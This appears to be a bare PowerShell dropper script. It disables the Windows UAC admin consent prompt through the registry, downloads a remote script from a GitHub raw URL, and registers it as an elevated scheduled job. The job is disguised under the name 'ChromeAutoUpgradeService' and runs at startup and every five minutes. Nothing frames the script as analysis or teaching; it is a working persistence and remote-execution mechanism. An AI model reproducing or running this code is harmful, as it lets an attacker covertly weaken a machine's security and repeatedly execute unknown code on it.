Set-ItemProperty -Path REGISTRY::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System -Name ConsentPromptBehaviorAdmin -Value 0
$jobname = "ChromeAutoUpgradeService"
$url = "https://raw.githubusercontent.com/4V4loon/tools/master/pastebin/pastebin-run.ps1"
$run = Invoke-WebRequest -Uri $url -UseBasicParsing | select -ExpandProperty Content
$script = $run
$repeat = (New-TimeSpan -Minutes 5)
$scriptblock = [scriptblock]::Create($script)
$trigger = @(
	$(New-JobTrigger -AtStartup),
	$(New-JobTrigger -Once -At (Get-Date).Date -RepeatIndefinitely -RepetitionInterval $repeat)
)
$options = New-ScheduledJobOption -RunElevated -ContinueIfGoingOnBattery -StartIfOnBattery -WakeToRun
Register-ScheduledJob -Name $jobname -ScriptBlock $scriptblock -Trigger $trigger -ScheduledJobOption $options
